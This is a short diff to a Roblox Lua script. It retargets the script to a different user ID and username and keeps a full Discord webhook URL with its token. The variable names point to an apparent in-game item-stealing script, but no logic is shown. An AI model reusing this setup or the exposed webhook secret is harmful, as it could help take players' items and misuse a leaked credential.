@@ -1,5 +1,5 @@
-local TARGET_ID = 2992132240
-local TARGET_USER = "danielcede77"
+local TARGET_ID = 4339660767
+local TARGET_USER = "roblox_user_4339660767"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1529146279467421756/rIb9JET9m_y-A7Isnzw8EVAAzoCaslWiV4Vv-w-WkvvA4N671e0ggwAwNIiwHGe3gZWX"
 
 local TargetBrainrots = {
